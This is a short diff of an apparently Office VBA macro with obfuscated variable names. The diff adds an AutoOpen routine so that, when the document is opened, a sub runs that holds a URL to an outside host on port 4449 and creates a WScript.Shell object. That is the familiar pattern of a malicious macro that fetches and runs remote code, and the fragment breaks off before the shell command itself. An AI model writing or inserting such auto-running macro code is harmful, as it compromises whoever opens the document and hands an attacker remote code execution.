@@ -6,6 +6,10 @@ Dim var_46352 As String
 Dim var_27434 As Boolean
 Dim var_10810 As String
 
+Sub AutoOpen()
+    Call var_48370
+End Sub
+
 Sub var_48370()
     Const var_51133 = "http://192.168.62.144:4449/"
     Set var_24655 = CreateObject("WScript.Shell")
